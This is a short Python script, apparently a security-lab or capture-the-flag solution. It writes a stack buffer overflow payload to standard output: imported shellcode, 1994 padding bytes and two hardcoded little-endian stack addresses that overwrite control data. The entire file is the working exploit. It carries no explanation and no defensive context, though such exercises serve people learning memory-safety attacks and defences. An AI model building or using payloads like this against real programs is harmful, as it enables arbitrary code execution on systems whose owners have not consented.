#!/usr/bin/env python3

import sys

from shellcode import shellcode

sys.stdout.buffer.write(shellcode + b'\x01'*1994 + 0x7ffffff696d0.to_bytes(8, 'little') + 0x7ffffff69ee8.to_bytes(8, 'little'))